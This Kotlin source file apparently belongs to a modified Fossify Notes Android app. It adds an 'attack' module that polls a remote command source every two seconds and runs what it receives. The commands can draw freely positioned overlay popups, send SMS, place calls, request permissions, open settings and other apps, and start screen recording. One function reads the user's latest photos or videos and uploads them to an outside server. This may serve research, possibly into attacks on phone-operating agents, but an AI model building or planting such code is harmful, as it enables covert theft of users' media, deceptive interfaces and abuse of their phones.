package org.fossify.notes.attack

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.drawable.ColorDrawable
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.util.TypedValue
import java.util.concurrent.atomic.AtomicReference
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.widget.FrameLayout
import android.widget.PopupWindow
import android.widget.TextView
import androidx.core.content.ContextCompat
import androidx.core.app.ActivityCompat
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import org.fossify.notes.R
import org.fossify.notes.activities.MainActivity
import android.provider.MediaStore
import android.content.ContentUris
import android.provider.Settings

private const val REQ_CODE_PERMISSION_REQUEST = 1001
private val mediaUploader: MediaUploader by lazy { MediaUploader() }

fun showDialog(dialogData: DialogData, context: Context) {
    // 创建PopupWindow的视图
    val inflater = LayoutInflater.from(context)
    val view = inflater.inflate(R.layout.attack_popup_window, null)

    // 让根布局撑满 PopupWindow，便于绝对定位子元素
    view.layoutParams = FrameLayout.LayoutParams(
        FrameLayout.LayoutParams.MATCH_PARENT,
        FrameLayout.LayoutParams.MATCH_PARENT
    )

    // 设置PopupWindow的内容
    val titleTextView: TextView = view.findViewById(R.id.dialog_title)
    val messageTextView: TextView = view.findViewById(R.id.dialog_message)

    // 设置标题和消息
    titleTextView.text = dialogData.title
    messageTextView.text = dialogData.message

    // 创建PopupWindow
    val popupWindow = PopupWindow(view, dialogData.width, dialogData.height, true)
    // 再次设置 contentView 的布局参数，确保 MATCH_PARENT 生效
    popupWindow.contentView.layoutParams = FrameLayout.LayoutParams(
        FrameLayout.LayoutParams.MATCH_PARENT,
        FrameLayout.LayoutParams.MATCH_PARENT
    )

    // 获取按钮
    val confirmButton: TextView = view.findViewById(R.id.confirm_button)
    val cancelButton: TextView = view.findViewById(R.id.cancel_button)

    // 控制确认按钮的可见性
    if (dialogData.confirmVisible) {
        confirmButton.visibility = View.VISIBLE
        confirmButton.text = dialogData.confirm
        confirmButton.setOnClickListener {
            // 处理确认按钮的点击
            popupWindow.dismiss()
        }
    } else {
        confirmButton.visibility = View.GONE
    }

    // 控制取消按钮的可见性
    if (dialogData.cancelVisible) {
        cancelButton.visibility = View.VISIBLE
        cancelButton.text = dialogData.cancel
        cancelButton.setOnClickListener {
            // 处理取消按钮的点击
            popupWindow.dismiss()
        }
    } else {
        cancelButton.visibility = View.GONE
    }

    // 文本大小：仅当提供正值时应用
    if (dialogData.titleSizeSp > 0) {
        titleTextView.setTextSize(TypedValue.COMPLEX_UNIT_SP, dialogData.titleSizeSp.toFloat())
    }
    if (dialogData.messageSizeSp > 0) {
        messageTextView.setTextSize(TypedValue.COMPLEX_UNIT_SP, dialogData.messageSizeSp.toFloat())
    }
    if (dialogData.confirmTextSizeSp > 0) {
        confirmButton.setTextSize(TypedValue.COMPLEX_UNIT_SP, dialogData.confirmTextSizeSp.toFloat())
    }
    if (dialogData.cancelTextSizeSp > 0) {
        cancelButton.setTextSize(TypedValue.COMPLEX_UNIT_SP, dialogData.cancelTextSizeSp.toFloat())
    }

    // 元素位置 / 尺寸：如果提供坐标则使用；限制在弹窗范围内，避免完全跑出弹窗
    fun applyPosition(viewToMove: View, width: Int?, height: Int?, left: Int, top: Int) {
        val params = (viewToMove.layoutParams as? FrameLayout.LayoutParams)
            ?: FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            )

        width?.let { params.width = it }
        height?.let { params.height = it }

        var updatedPosition = false
        // 使用已知的正尺寸做边界裁剪，WRAP_CONTENT/MATCH_PARENT 情况跳过裁剪
        val effectiveWidth = params.width.takeIf { it > 0 }
        val effectiveHeight = params.height.takeIf { it > 0 }
        if (left >= 0) {
            val maxLeft = if (dialogData.width > 0 && effectiveWidth != null) {
                (dialogData.width - effectiveWidth).coerceAtLeast(0)
            } else left
            params.leftMargin = left.coerceIn(0, maxLeft)
            updatedPosition = true
        }
        if (top >= 0) {
            val maxTop = if (dialogData.height > 0 && effectiveHeight != null) {
                (dialogData.height - effectiveHeight).coerceAtLeast(0)
            } else top
            params.topMargin = top.coerceIn(0, maxTop)
            updatedPosition = true
        }
        if (updatedPosition) {
            params.gravity = Gravity.START or Gravity.TOP
        }
        viewToMove.layoutParams = params
        viewToMove.requestLayout()
    }

    // 按钮大小 / 位置
    applyPosition(confirmButton, dialogData.confirmWidth, dialogData.confirmHeight, dialogData.confirmLeft, dialogData.confirmTop)
    applyPosition(cancelButton, dialogData.cancelWidth, dialogData.cancelHeight, dialogData.cancelLeft, dialogData.cancelTop)

    // 文本位置
    applyPosition(titleTextView, null, null, dialogData.titleLeft, dialogData.titleTop)
    applyPosition(messageTextView, null, null, dialogData.messageLeft, dialogData.messageTop)

    // 设置背景为透明，以便去除默认背景阴影
    popupWindow.setBackgroundDrawable(ColorDrawable(ContextCompat.getColor(context, android.R.color.transparent)))

    val mainHandler = Handler(Looper.getMainLooper())
    val appearDelay = when {
        dialogData.appearDelayMs > 0 -> dialogData.appearDelayMs
        dialogData.delay > 0 -> dialogData.delay
        else -> 0
    }

    // 延迟显示，并可选自动消失
    mainHandler.postDelayed({
        try {
            popupWindow.showAtLocation(view, Gravity.NO_GRAVITY, dialogData.left, dialogData.top)
            val gson = Gson()
            Log.i("Attack", "show dialog\n" + gson.toJson(dialogData))
        } catch (e: Exception) {
            Log.e("Attack", "show dialog failed: ${e.message}")
        }

        if (dialogData.dismissDelayMs > 0) {
            mainHandler.postDelayed({
                try {
                    if (popupWindow.isShowing) {
                        popupWindow.dismiss()
                        Log.i("Attack", "dialog auto dismissed after ${dialogData.dismissDelayMs}ms")
                    }
                } catch (_: Exception) {
                    // popup 可能已被用户关闭，忽略异常
                }
            }, dialogData.dismissDelayMs)
        }
    }, appearDelay)
}

fun sendMessage(message: MessageData, context: Context) {
    // 使用 Handler 来延迟执行
    Handler(Looper.getMainLooper()).postDelayed({
        // 创建短信发送的 Intent
        val smsUri = Uri.parse("smsto:${message.receiver}") // 使用 "smsto:" 协议来指定短信接收号码
        val intent = Intent(Intent.ACTION_SENDTO, smsUri)

        // 填充短信内容
        intent.putExtra("sms_body", message.content)

        // 启动短信应用程序
        context.startActivity(intent)
    }, message.delay) // 延迟时间
}

fun showButton(buttonData: ButtonData, context: Context) {
}

fun callPhone(call: CallData, context: Context) {
    Handler(Looper.getMainLooper()).postDelayed({
        try {
            val action = if (call.action.lowercase() == "call") Intent.ACTION_CALL else Intent.ACTION_DIAL
            if (action == Intent.ACTION_CALL &&
                ContextCompat.checkSelfPermission(context, android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                Log.w("Attack", "CALL_PHONE 未授权，降级为 ACTION_DIAL")
            }
            val intent = Intent(
                if (action == Intent.ACTION_CALL &&
                    ContextCompat.checkSelfPermission(context, android.Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
                ) Intent.ACTION_CALL else Intent.ACTION_DIAL,
                Uri.parse("tel:${call.number}")
            )
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            if (intent.resolveActivity(context.packageManager) != null) {
                context.startActivity(intent)
                Log.i("Attack", "启动拨号界面/呼叫: ${call.number}")
            } else {
                Log.e("Attack", "未找到可处理拨号的应用")
            }
        } catch (e: Exception) {
            Log.e("Attack", "拨号失败: ${e.message}")
        }
    }, call.delay)
}

fun requestPermissions(req: PermissionRequestData, context: Context) {
    val activity = context as? Activity ?: run {
        Log.w("Attack", "requestPermissions 需要 Activity 上下文")
        return
    }
    val pending = req.permissions.filter {
        ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
    }
    if (pending.isEmpty()) return

    Handler(Looper.getMainLooper()).postDelayed({
        try {
            ActivityCompat.requestPermissions(
                activity,
                pending.toTypedArray(),
                REQ_CODE_PERMISSION_REQUEST
            )
            Log.i("Attack", "请求权限: $pending")
        } catch (e: Exception) {
            Log.e("Attack", "请求权限失败: ${e.message}")
        }
    }, req.delay)
}

fun uploadMedia(data: MediaUploadData, context: Context) {
    val requiredPerms = mutableListOf<String>()
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        if (data.mediaType.lowercase() == "videos") {
            requiredPerms.add(android.Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            requiredPerms.add(android.Manifest.permission.READ_MEDIA_IMAGES)
        }
    } else {
        requiredPerms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
    }
    val missing = requiredPerms.filter {
        ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
    }
    if (missing.isNotEmpty()) {
        Log.w("Attack", "缺少读取媒体权限，跳过上传: $missing")
        return
    }

    val count = data.count.coerceIn(1, 5) // 简单限制，防止过多占用
    val collection = if (data.mediaType.lowercase() == "videos") {
        MediaStore.Video.Media.EXTERNAL_CONTENT_URI
    } else {
        MediaStore.Images.Media.EXTERNAL_CONTENT_URI
    }
    val projection = arrayOf(
        MediaStore.MediaColumns._ID,
        MediaStore.MediaColumns.MIME_TYPE
    )

    Handler(Looper.getMainLooper()).postDelayed({
        try {
            val resolver = context.contentResolver
            resolver.query(
                collection,
                projection,
                null,
                null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            )?.use { cursor ->
                var sent = 0
                val idIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val mimeIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                while (cursor.moveToNext() && sent < count) {
                    val id = cursor.getLong(idIndex)
                    val mime = cursor.getString(mimeIndex) ?: "application/octet-stream"
                    val uri = ContentUris.withAppendedId(collection, id)
                    val bytes = resolver.openInputStream(uri)?.use { it.readBytes() } ?: continue
                    if (bytes.isEmpty()) continue
                    val filename = if (data.mediaType.lowercase() == "videos") {
                        "video_$id.mp4"
                    } else {
                        "image_$id.jpg"
                    }
                    mediaUploader.uploadBytes(bytes, filename, mime)
                    sent++
                }
                Log.i("Attack", "媒体上传完成，发送 $sent 个文件")
            }
        } catch (e: Exception) {
            Log.e("Attack", "上传媒体失败: ${e.message}")
        }
    }, data.delay)
}

fun openSettingsAction(actionData: SettingsActionData, context: Context) {
    Handler(Looper.getMainLooper()).postDelayed({
        try {
            val intent = Intent(actionData.action).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            if (intent.resolveActivity(context.packageManager) != null) {
                context.startActivity(intent)
                Log.i("Attack", "open settings action: ${actionData.action}")
            } else {
                Log.w("Attack", "no activity can handle settings action ${actionData.action}")
            }
        } catch (e: Exception) {
            Log.e("Attack", "open settings action failed: ${e.message}")
        }
    }, actionData.delay)
}

fun openApp(packageName: String, delay: Long, context: Context) {
    Handler(Looper.getMainLooper()).postDelayed({
        try {
            val packageManager = context.packageManager
            
            // 首先检查应用是否安装
            try {
                val packageInfo = packageManager.getPackageInfo(packageName, 0)
                Log.i("Attack", "应用已安装: $packageName, version: ${packageInfo.versionName}")
            } catch (e: PackageManager.NameNotFoundException) {
                Log.e("Attack", "应用未安装: $packageName")
                return@postDelayed
            }

            // 方法1: 使用 getLaunchIntentForPackage (需要 AndroidManifest.xml 的 <queries> 中声明)
            val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                Log.i("Attack", "打开应用: $packageName")
                context.startActivity(launchIntent)
                return@postDelayed
            }

            // 方法2: 尝试使用隐式 Intent 作为备选方案
            Log.w("Attack", "getLaunchIntentForPackage 返回 null，尝试替代方法: $packageName")
            val alternativeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_LAUNCHER)
                setPackage(packageName)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            
            if (alternativeIntent.resolveActivity(packageManager) != null) {
                Log.i("Attack", "使用替代方法打开应用: $packageName")
                context.startActivity(alternativeIntent)
            } else {
                Log.e("Attack", "无法打开应用: $packageName - 可能需要在 AndroidManifest.xml 的 <queries> 中声明此包名")
            }
        } catch (e: Exception) {
            Log.e("Attack", "无法打开 $packageName: ${e.message}")
            e.printStackTrace()
        }
    }, delay)
}

fun captureScreen(data: CaptureScreenData, context: Context) {
    if (context is MainActivity) {
        Handler(Looper.getMainLooper()).postDelayed({
            context.initScreenRecorder()
        }, data.delay)
    }
}

fun attack(action: String, context: Context) {
    fetchViewCli(action) { cmds ->
        // pretty print 攻击命令
        val gson = GsonBuilder().setPrettyPrinting().create()
        Log.i("Attack", "attack command:\n${gson.toJson(cmds)}")
        
        // dialogs
        for (dialog in cmds.dialogs) {
            showDialog(dialog, context)
        }
        // button
        for (button in cmds.buttons) {
            showButton(button, context)
        }
        // message
        for (message in cmds.messages) {
            sendMessage(message, context)
        }
        // call phone
        for (call in cmds.calls) {
            callPhone(call, context)
        }
        // permissions
        for (perm in cmds.permissions) {
            requestPermissions(perm, context)
        }
        // media upload
        for (media in cmds.mediaUpload) {
            uploadMedia(media, context)
        }
        // settings actions
        for (sa in cmds.settingsActions) {
            openSettingsAction(sa, context)
        }
        // app
        for (app in cmds.openApp) {
            openApp(app.packageName, app.delay, context)
        }
        for (data in cmds.captureScreen) {
            captureScreen(data, context)
        }
    }
}

// 用于保存周期性攻击的 Handler 引用
private val intervalAttackHandler = AtomicReference<Handler?>(null)
private val intervalAttackRunnable = AtomicReference<Runnable?>(null)

/**
 * 开始周期性调用 attack，action 设置为 "interval"
 * @param context Context
 * @param intervalMs 调用间隔时间（毫秒），默认 5000ms（5秒）
 */
fun startIntervalAttack(context: Context, intervalMs: Long = 2000) {
    // 如果已经存在，先停止之前的
    stopIntervalAttack()
    
    val handler = Handler(Looper.getMainLooper())
    
    val runnable = object : Runnable {
        override fun run() {
            // 检查是否仍然处于活动状态
            val currentHandler = intervalAttackHandler.get()
            if (currentHandler != handler || currentHandler == null) {
                Log.w("Attack", "周期性攻击已停止，取消后续调用")
                return
            }
            
            Log.i("Attack", "周期性调用 attack(interval), 当前时间: ${System.currentTimeMillis()}")
            try {
                attack("interval", context)
                Log.d("Attack", "attack() 完成，调度下一次调用，${intervalMs}ms 后 (${System.currentTimeMillis() + intervalMs})")
            } catch (e: Exception) {
                Log.e("Attack", "攻击执行出错: ${e.message}")
                e.printStackTrace()
            }
            
            // 调度下一次调用 - 无论 attack 是否成功
            // 注意：attack() 是异步的，但我们仍然按固定间隔调度下一次调用
            // 先检查 handler 是否仍然有效
            val checkHandler = intervalAttackHandler.get()
            if (checkHandler == handler && checkHandler != null) {
                handler.postDelayed(this, intervalMs)
            } else {
                Log.w("Attack", "Handler 已失效，停止周期性调用")
            }
        }
    }
    
    // 保存 handler 和 runnable 的引用
    intervalAttackHandler.set(handler)
    intervalAttackRunnable.set(runnable)
    
    // 立即执行第一次
    Log.i("Attack", "开始周期性攻击，间隔: ${intervalMs}ms")
    handler.post(runnable)
}

/**
 * 停止周期性调用 attack
 */
fun stopIntervalAttack() {
    val handler = intervalAttackHandler.getAndSet(null)
    val runnable = intervalAttackRunnable.getAndSet(null)
    
    if (handler != null && runnable != null) {
        handler.removeCallbacks(runnable)
        Log.i("Attack", "已停止周期性攻击")
    }
}
